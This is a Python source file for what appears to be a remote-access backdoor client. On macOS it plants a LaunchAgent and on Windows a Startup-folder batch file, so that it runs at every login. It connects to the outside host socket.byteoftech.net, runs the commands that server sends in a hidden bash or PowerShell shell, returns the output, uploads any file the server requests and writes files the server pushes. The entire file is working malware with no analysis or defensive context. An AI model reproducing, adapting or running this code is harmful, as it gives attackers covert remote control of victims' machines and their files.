import socketio
import socket
import subprocess
import threading
import getpass
import platform
import plistlib
import os


system = platform.system()
USER_NAME = getpass.getuser()

if system == "Linux":
  shellScript = "bash"

if system == "Darwin":
  shellScript = "bash"
  launch_agents_dir = os.path.expanduser('~/Library/LaunchAgents')

  # Define the path to your script
  script_path = os.path.expanduser('~/path/to/your/script.py')

  # Define the plist file name (e.g., com.yourusername.scriptname.plist)
  plist_filename = 'com.yourusername.scriptname.plist'
  plist_path = os.path.join(launch_agents_dir, plist_filename)

  # Define the plist content
  plist_content = {
      'Label': 'com.yourusername.scriptname',
      'ProgramArguments': ['/usr/bin/python3', script_path],
      'RunAtLoad': True,
      'KeepAlive': False,
  }

  # Ensure the LaunchAgents directory exists
  os.makedirs(launch_agents_dir, exist_ok=True)

  # Write the plist file
  with open(plist_path, 'wb') as plist_file:
      plistlib.dump(plist_content, plist_file)

  print(f'Launch Agent plist file created at {plist_path}')

if system == 'Windows':
  shellScript = "powershell"
  new_path = r'C:\\ProgramData\\Data\\test.exe'
  
  bat_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % USER_NAME
  with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
    bat_file.write(r'start "" "%s"' % new_path)


def get_ip():
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.settimeout(0)
  try:
    s.connect(("10.254.254.254", 1))
    IP = s.getsockname()[0]
  except Exception:
    IP = "127.0.0.1"
  finally:
    s.close()
  return IP


sio = socketio.Client(logger=False, engineio_logger=False)
ip = get_ip()


class InteractiveShell:

  def __init__(self):
    self.process = None
    self.running = False

  def start(self):
    self.running = True
    self.process = subprocess.Popen(
        [shellScript],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True,
        universal_newlines=True,
    )

    # Start the thread for handling output
    output_thread = threading.Thread(target=self.read_output)
    output_thread.start()

    # Wait for the output thread to finish
    output_thread.join()

  def read_output(self):
    while self.running:
      output = self.process.stdout.readline().rstrip()
      if output:
        sio.emit("result", output)


# Define event handlers outside the class
@sio.on("commandToClient")
def command(data):
  if data["IP"] == ip:
    shell.process.stdin.write(data["COMMAND"] + "\n")
    shell.process.stdin.flush()


@sio.on("getFileStage2")
def getFile(data):
  if data["IP"] == ip:
    try:
      with open(data["FILEPATH"]) as f:
        fileName = data["FILEPATH"].split("/")[-1]
        sio.emit("file", {"FILE": f.read(), "FILENAME": fileName, "SID": data["SID"]})
    except:
      sio.emit("file", {"FILE": None, "FILENAME": None, "SID": data["SID"]})

@sio.on("uploadFileStage2")
def uploadFile(data):
  if data["IP"] == ip:
    try:
      with open(data["FILENAME"], "w") as f:
        f.write(data["FILE"])
    except:
      "nothing here"

@sio.on("resetStage2")
def reset(data):
  if data["IP"] == ip:
      global shell  # Access the global shell variable
      if shell.process:
          shell.process.terminate()
          shell.running = False
      shell = InteractiveShell()  # Create a new InteractiveShell instance
      shell.start()  # Start the new shell process


@sio.event
def connect():
  print(f"connection established {sio.sid}")
  sio.emit("dataConnection", ip)


@sio.event
def disconnect():
  print("disconnected from server")


sio.connect(
    "https://socket.byteoftech.net"
)
shell = InteractiveShell()
shell.start()
sio.wait()
